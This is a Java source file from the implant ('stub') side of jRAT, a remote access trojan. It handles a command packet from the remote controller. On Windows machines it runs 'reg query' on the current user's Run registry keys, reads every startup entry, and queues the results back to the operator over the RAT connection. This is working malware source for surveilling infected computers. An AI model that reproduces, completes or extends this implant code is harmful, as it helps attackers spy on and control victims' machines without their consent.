package io.jrat.stub.packets.incoming;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet53RegistryStartup;

import java.io.BufferedReader;
import java.io.InputStreamReader;


public class Packet78RegistryStartup extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");

					Connection.addToSendQueue(new Packet53RegistryStartup(args));
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			Connection.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
